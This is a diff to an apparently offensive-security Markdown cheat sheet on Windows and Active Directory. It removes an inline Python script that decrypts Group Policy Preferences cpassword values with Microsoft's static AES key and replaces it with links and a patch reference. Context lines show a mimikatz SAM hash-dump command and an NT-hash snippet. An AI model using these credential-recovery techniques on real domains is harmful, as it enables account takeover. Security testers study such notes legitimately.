@@ -1,6 +1,4 @@
-Windows
-=======
-
+# Windows
 
 ### List SPN accounts
 
@@ -150,45 +148,19 @@ foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccount
 
 
 ### Decrypt GPO with cpassword
-```python
-#!/usr/bin/python
 
-import sys
-import binascii
+Some `Group Policy Preferences` (GPP) GPO stored at `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
+contains an account credentials for administration on a remote host.
+The credentials are encrypted using a [static AES key provided by Microsoft](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).
+A domain user can access the GPP XML files on read the encrypted password. To
+get the clear text credentials the [Python script can be used](./assets/cpassword.py).
 
-from Crypto.Cipher import AES
-from base64 import b64decode
-
-unpad = lambda s: s[:-1 * ord(s[-1])]
-
-def decrypt(cpassword):
-    # Init the key
-    # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
-    key = binascii.unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
-
-    # Add padding to the base64 string and decode it
-    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
-    password = b64decode(cpassword)
-    o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
-
-    return unpad(o).decode("utf16")
-
-def main():
-    if len(sys.argv) != 2:
-        print("Usage: gpprefdecrypt.py <cpassword>")
-        sys.exit(0)
-
-    cpassword = sys.argv[1]
-    o = decrypt(cpassword)
-
-    print o
-
-if __name__ == "__main__":
-    main()
-```
+This [article on AdSecurity](https://adsecurity.org/?p=2288) presents other tools
+and the protection ([KB2962486](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati)).
 
 
 ### Use Win32 API in Python
+
 Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)
 
 
@@ -242,7 +214,7 @@ $ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 ```python
 import hashlib
 pwd = "password"
-print(hashlib.new('md4', f'{pwd}'.encode('utf-16le')).hexdigest())
+print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
 ```
 
 
